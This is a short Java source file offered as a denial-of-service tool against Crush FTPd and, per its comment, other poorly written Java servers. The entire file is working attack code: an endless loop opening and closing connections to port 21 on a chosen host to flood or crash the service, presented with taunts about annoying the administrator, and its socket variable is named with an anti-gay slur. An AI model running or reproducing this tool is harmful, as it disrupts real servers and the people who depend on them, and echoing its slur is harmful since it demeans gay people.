/* Crush FTPd Denial of Service
 *
 * Simple Code to make Crush FTPd pull focus every two seconds with error
 * messages. Annoying as all hell. ;-) Will work on any other badly coded Java
 * HTTP/FTP/Whatever server too, shutting down some of them and flooding the
 * rest with error messages. :P
 */

import java.io.*;
import java.net.*;

public class CrushIt {

  public static void main(String[] args) {
  Socket gay = null;

  if (args.length != 1) {
    System.out.println("Syntax: java CrushIt [hostname]");
    System.exit(1); }

  System.out.println("Press Control-C at any time to stop annoying Admin");
  for (;;) { try { gay = new Socket(args[0], 21); gay.close(); } catch (Exception e) {}}}}